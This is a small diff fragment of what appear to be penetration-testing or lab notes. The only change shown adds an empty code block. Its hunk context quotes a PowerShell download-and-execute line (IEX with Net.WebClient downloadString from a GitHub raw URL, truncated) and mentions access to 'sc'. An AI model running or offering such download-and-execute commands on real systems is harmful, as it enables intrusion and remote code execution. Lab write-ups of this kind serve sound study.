@@ -24,3 +24,7 @@ powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubuser
 As we can see that we have access to sc
 ![[Pasted image 20241008072610.png]]
 
+
+```
+
+```
